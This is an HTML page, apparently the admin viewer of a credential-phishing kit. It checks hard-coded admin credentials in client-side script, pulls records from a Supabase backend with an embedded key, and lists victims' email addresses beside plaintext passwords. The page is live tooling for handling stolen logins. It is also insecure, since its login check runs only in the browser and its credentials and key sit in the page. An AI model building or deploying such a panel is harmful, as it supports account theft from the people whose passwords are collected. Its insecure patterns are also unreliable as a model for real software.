<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Management Portal</title>
    <style>
        body { font-family: sans-serif; padding: 40px; background: #f4f7f6; }
        .box { max-width: 350px; margin: 100px auto; padding: 30px; background: white; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); }
        input, button { width: 100%; margin-bottom: 15px; padding: 12px; border-radius: 6px; border: 1px solid #ccc; box-sizing: border-box; }
        button { background: #0b57d0; color: white; border: none; cursor: pointer; font-weight: bold; }
        table { width: 100%; border-collapse: collapse; background: white; margin-top: 20px; }
        th, td { border: 1px solid #eee; padding: 15px; text-align: left; }
        th { background: #0b57d0; color: white; }
        #view { display: none; }
    </style>
</head>
<body>

    <div id="login" class="box">
        <h2>Admin Login</h2>
        <input type="text" id="u" placeholder="Username">
        <input type="password" id="p" placeholder="Password">
        <button onclick="check()">Login</button>
    </div>

    <div id="view">
        <div style="display:flex; justify-content: space-between;">
            <h2>Records</h2>
            <button onclick="location.reload()" style="width:auto; background:#d93025;">Logout</button>
        </div>
        <table>
            <thead><tr><th>Email</th><th>Password</th><th>Date</th></tr></thead>
            <tbody id="list"></tbody>
        </table>
    </div>

    <script>
        // Use direct fetch to avoid "Supabase is not defined" error
        const API_URL = 'https://supabase.co';
        const API_KEY = 'sb_publishable_MZZ1I6MzxmRZDXWxfkRfXQ_UhwCCMK_';

        function check() {
            const user = document.getElementById('u').value;
            const pass = document.getElementById('p').value;

            if (user === "adminadminadmin123" && pass === "ILOVE67KID") {
                showData();
            } else {
                alert("Access Denied");
            }
        }

        async function showData() {
            document.getElementById('login').style.display = 'none';
            document.getElementById('view').style.display = 'block';
            const table = document.getElementById('list');
            table.innerHTML = '<tr><td colspan="3">Loading...</td></tr>';

            try {
                const response = await fetch(API_URL + '?select=*', {
                    method: 'GET',
                    headers: {
                        'apikey': API_KEY,
                        'Authorization': 'Bearer ' + API_KEY
                    }
                });
                
                const data = await response.json();
                table.innerHTML = '';
                
                if (data && data.length > 0) {
                    data.forEach(row => {
                        table.innerHTML += `<tr>
                            <td>${row.email}</td>
                            <td>${row.password}</td>
                            <td>${new Date(row.created_at).toLocaleString()}</td>
                        </tr>`;
                    });
                } else {
                    table.innerHTML = '<tr><td colspan="3">No records found.</td></tr>';
                }
            } catch (err) {
                table.innerHTML = '<tr><td colspan="3" style="color:red">Network Blocked. Use a phone hotspot.</td></tr>';
            }
        }
    </script>
</body>
</html>
